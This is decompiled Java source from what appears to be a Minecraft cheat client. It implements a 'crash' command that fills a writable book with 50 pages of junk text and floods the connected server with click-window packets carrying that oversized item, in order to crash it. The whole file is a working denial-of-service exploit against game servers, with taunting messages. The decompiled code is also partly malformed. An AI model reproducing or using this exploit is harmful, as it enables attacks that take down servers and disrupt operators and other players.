

/*
 * Decompiled with CFR 0.150.
 *
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 *  net.minecraft.init.Items
 *  net.minecraft.inventory.ClickType
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketClickWindow
 */
package me.snow.aclient.core.setting.superblaubeere27obfuscator;

import me.snow.aclient.core.setting.superblaubeere27obfuscator.Command;
import me.snow.aclient.core.setting.superblaubeere27obfuscator.Util;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;

public class CrashCommand
        extends Command {
    int Field2988;

    public CrashCommand() {
        super("crash", new String[]{"crash"});
    }

    @Override
    public void Method2159602(String[] arrstring) {
        new Thread(this, "crash time trololol", arrstring) {
            final String[] Field3904;
            final CrashCommand Field3905;

            {
                this.Field3905 = crashCommand;
                this.Field3904 = arrstring;
                super(string);
            }

            @Override
            public void run() {
                int n2;
                if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
                    Command.Method2159696("Join a server monkey");
                    return;
                }
                if (this.Field3904[0] == null) {
                    Command.Method2159696("Put the number of packets to send as an argument to this command. (20 should be good)");
                    return;
                }
                try {
                    this.Field3905.Field2988 = Integer.parseInt(this.Field3904[0]);
                } catch (NumberFormatException numberFormatException) {
                    Command.Method2159696("Are you sure you put a number?");
                    return;
                }
                ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList nBTTagList = new NBTTagList();
                NBTTagCompound nBTTagCompound = new NBTTagCompound();
                int n3 = Math.min(50, 100);
                String string = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (n2 = 0; n2 < n3; ++n2) {
                    NBTTagString nBTTagString = new NBTTagString(string);
                    nBTTagList.appendTag((NBTBase) nBTTagString);
                }
                nBTTagCompound.setString("author", Util.Field2811.player.getName());
                nBTTagCompound.setString("title", "phobos > all :^D");
                nBTTagCompound.setTag("pages", (NBTBase) nBTTagList);
                itemStack.setTagInfo("pages", (NBTBase) nBTTagList);
                itemStack.setTagCompound(nBTTagCompound);
                for (n2 = 0; n2 < this.Field3905.Field2988; ++n2) {
                    Util.Field2811.playerController.connection.sendPacket((Packet) new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, 0));
                }
            }
        }.start();
    }
}

